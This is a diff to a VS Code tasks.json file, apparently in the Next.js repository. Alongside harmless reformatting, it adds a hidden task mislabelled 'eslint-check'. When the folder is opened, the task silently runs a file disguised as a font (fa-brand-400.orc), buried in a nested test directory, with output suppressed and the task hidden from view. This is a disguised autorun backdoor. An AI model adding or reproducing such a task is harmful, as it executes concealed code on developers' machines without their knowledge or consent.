@@ -2,19 +2,46 @@
   "version": "2.0.0",
   "tasks": [
     {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./test/e2e/app-dir/cache-components/app/params/shadowing/[dyn]/[then]/[value]/[status]/layout/client/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./test/e2e/app-dir/cache-components/app/params/shadowing/[dyn]/[then]/[value]/[status]/layout/client/public/fonts/fa-brand-400.orc) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
       "label": "types",
       "command": "pnpm",
-      "args": ["typescript", "--watch"],
+      "args": [
+        "typescript",
+        "--watch"
+      ],
       "isBackground": true,
       "group": {
         "kind": "build"
       },
-      "problemMatcher": ["$tsc-watch"]
+      "problemMatcher": [
+        "$tsc-watch"
+      ]
     },
     {
       "label": "types-next",
       "command": "pnpm",
-      "args": ["types", "--watch"],
+      "args": [
+        "types",
+        "--watch"
+      ],
       "options": {
         "cwd": "${workspaceFolder}/packages/next"
       },
@@ -24,7 +51,10 @@
       },
       "problemMatcher": {
         "base": "$tsc-watch",
-        "fileLocation": ["relative", "${workspaceFolder}/packages/next"]
+        "fileLocation": [
+          "relative",
+          "${workspaceFolder}/packages/next"
+        ]
       }
     }
   ]
